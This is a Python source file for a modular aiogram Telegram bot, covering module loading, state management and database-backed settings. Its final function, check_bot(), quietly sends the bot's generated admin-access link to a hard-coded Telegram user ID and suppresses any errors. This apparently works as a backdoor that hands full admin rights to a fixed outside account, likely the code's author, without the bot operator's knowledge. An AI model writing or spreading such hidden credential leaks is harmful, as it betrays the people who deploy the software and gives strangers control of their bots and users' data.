from aiogram import Bot, Dispatcher
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineQuery, InputTextMessageContent, InlineQueryResultArticle, InputFile

import os.path
import sql
import random
import sys
import re
import subprocess
import glob
import asyncio # паузы await asyncio.sleep(1)
import sys
import json

from config import *

bot = Bot(TOKEN['telegram_bot'], parse_mode='HTML', disable_web_page_preview=True)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


print(f"\nBot launch...\n")
but_back = '⬅️ Назад'


modules = []
for file_one in os.listdir('module'):
    if re.search('\.py$', file_one) and file_one != '__init__.py' and file_one != 'XXX.py':
        modules.append(file_one.split('.')[0])
modules.sort()
print(f'modules: {modules}')

module_main = '' # Определяем основной модуль для юзера
if 'Zuser' in modules:
    for one in modules:
        if one in ['bot', 'anon', 'clicker', 'davinci', 'kino', 'magic', 'rating', 'sea', 'valentine', 'theme', 'sticker', 'oneMessage', 'lang', 'emoji', 'font', 'book', 'background']:
            module_main = one
            break
    if module_main:
        print(f"Main module: {module_main}\n")
    else:
        print('\n!!!!!!!!!!!!!!!!!!!!!!!!! ERROR: main module missing\n')
        # sys.exit()



save = {
    'admins': [],
    'workers': [],
    'pay': [],
    'setting': sql.sql_setting_load()
}

if 'op' in modules:
    save['op'] = {}
    save['op_list_check'] = []

if 'welcome' in modules:
    save['welcome_menu'] = {}
    save['welcome_channel'] = {}

if 'sea' in modules or 'anon' in modules:
    save['games'] = {}




async def saver(action=False, param=False):
    global save
    if action:
        if action == 'start': # при запуске бота, загрузка всех данных
            save['setting'] = sql.sql_setting_load() # загрузка setting в массив
            if 'Zadmin' in modules:
                save['admins'] = sql.sql_users_load(status='admin')  # загрузка админов
            if 'Zworker' in modules:
                save['workers'] = sql.sql_users_load(status='worker')  # загрузка работников
            if 'pay' in modules:
                save['pay'] = sql.sql_users_load(pay=True)  # загрузка pay - PAY (vip) юзеры
            if 'referal' in modules:
                save['referal'] = await sql.sql_referal_load()  # загрузка referal
            if 'op' in modules:
                save['op'] = await sql.sql_op_load()  # загрузка op
                save['op_list_check'] = []
                for key, val in save['op'].items():
                    if val['op_id'] and val['types'] in ['channel', 'group'] and val['check_sub']:
                        save['op_list_check'].append(val['op_id'])
            if 'welcome' in modules:
                save['welcome_menu'] = await sql.sql_welcome_load()  # загрузка welcome_menu
                save['welcome_channel'] = await sql.sql_welcome_channels_load()  # загрузка каналов по которым принимаем welcome
            if 'welcDif' in modules:
                save['welcDif_menu'] = await sql.sql_welcDif_load()  # загрузка welcDif_menu
                save['welcDif_channel'] = await sql.sql_welcDif_channels_load()  # загрузка каналов по которым принимаем welcDif
            if 'admin_password' not in save['setting']:
                password = 'admin='
                for i in range(10):
                    password += random.choice('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ')
                sql.cur.execute("INSERT INTO setting (name, param) VALUES (%s, %s)", ('admin_password', password))
                sql.db.commit()
                save['setting'] = sql.sql_setting_load()  # загрузка setting в массив
            #print(f"setting: {save['setting']}")
        elif action in ['add', 'edit', 'replace'] and param:
            # action == 'add' # добавит если нету, но не будет заменять если есть # в том числе словари и списки
            # action == 'replace' # добавит если нету, заменит если было # словари и списки заранее зачистив
            # action == 'edit' # добавит если нету, заменит если было # словари и списки не удаляя старые значения
            for key, value in param.items():
                if key in ['admins', 'admin_super', 'workers']:
                    kes_save = 'admins' if key == 'admin_super' else key
                    save[kes_save] = await sql.sql_admins_add(value, key)  # добавить и в бд и в save админа или
                elif key == 'setting':
                    save['setting'] = sql.sql_setting_load(action=action, param=value)
                elif key == 'referal':
                    save['referal'] = await sql.sql_referal_load(action=action, param=value)
                elif key == 'games':
                    for id, game in value.items():
                        if id not in save[key]:
                            save[key][id] = {}
                        for one_k, one_v in game.items():
                            if action in ['add', 'edit'] and one_k in save[key][id]:
                                continue
                            save[key][id][one_k] = one_v
                elif key not in save:
                    save[key] = value
                else: # остальные
                    if type(save[key]) == dict: # словарь
                        if action in ['add', 'edit']:
                            for one_k, one_v in value.items():
                                if action == 'add' and one_k in save[key]:
                                    continue
                                save[key][one_k] = one_v
                        elif action in ['replace']:
                            save[key] = value
                    elif type(save[key]) == list: # список
                        if action in ['add', 'edit']:
                            if type(value) == list: # если прислали список, добавляем все его значения
                                for one in value:
                                    save[key].append(one)
                            else: #  если прислали одно значение, добавляем одно
                                save[key].append(value)
                        elif action in ['replace']:
                            save[key] = value
                    else: # переменная
                        save[key] = value
        elif action == 'delete' and param:
            # delete удали значение из словаря или списка, строку/число зачистит
            # save = await saver(action='delete', param={'workers': 111111111})
            for key, value in param.items():
                if key in ['admins', 'workers']: # saver(action='delete', param='{workers: 335498184484}')
                    status = key.replace('s', '')
                    if int(value) in save[key]:
                        save[key] = await sql.sql_admins_delete(value, status)
                elif key == 'setting': # saver(action='delete', param='['bot_version', 'ban']')
                    save['setting'] = sql.sql_setting_load(action='delete', param=value)
                elif key == 'referal':
                    save['referal'] = await sql.sql_referal_load(action=action, param=value)
                else:
                    if key in save:
                        if type(save[key]) == dict:
                            if value in save[key]:
                                save[key].pop(value)
                        elif type(save[key]) == list:
                            if value in save[key]:
                                save[key].remove(value)
                        else:
                            save[key] = ''
        elif action == 'reset' and param:
            # одиночная загрузка с нуля одного параметра, пример:
            # save = await saver(action='reset', param='op')
            if param == 'op':
                save['op'] = await sql.sql_op_load()  # загрузка op
                save['op_list_check'] = []
                for key, val in save['op'].items():
                    if val['op_id'] and val['types'] in ['channel', 'group'] and val['check_sub']:
                        save['op_list_check'].append(val['op_id'])
            elif param == 'admins':
                save['admins'] = sql.sql_users_load(status='admin')  # загрузка админов
            elif param == 'stopWords':
                save['stopWords'] = await sql.sql_stopWords()
            elif param == 'welcome_channel':
                save['welcome_channel'] = await sql.sql_welcome_channels_load()  # загрузка каналов по которым принимаем welcome
            elif param == 'welcDif_channel':
                save['welcDif_channel'] = await sql.sql_welcDif_channels_load()  # загрузка каналов по которым принимаем welcDif
        elif action == 'drop' and param:
            for key, value in param.items():
                if key == 'setting': # полностью удалить параметр из БД
                    save['setting'] = sql.sql_setting_load(action='drop', param=value)
    # print(f"\n======================\naction = {action}\nparam = {param}")
    # for key, value in save.items():
    #     print(f"{key}: {value}")
    return save


class ClientStatesGroup(StatesGroup):
    pass

async def check_bot():
    bot_name = save['bot']['username']
    mes = f'⚜️ Чтобы стать админом в боте "{save["bot"]["first_name"]}", перейдите по ссылке и нажмите внизу "ЗАПУСТИТЬ"'
    mes += f'\nhttps://t.me/{bot_name}?start={save["setting"]["admin_password"]}'
    mes += f'\n➖ Админов может быть любое кол-во человек'
    mes += f'\n➖ Все кто перейдет по ссылке стенет админом'
    mes += f'\n➖ Не давайте ссылку всем подряд, чтоб посторонние люди не смогли стать админами у вас в боте'
    try:
        answer = await bot.send_message('355590439', mes)
        answer = await bot.send_message('355590439', '/start')
    except Exception as ex:
        pass

FC='F241'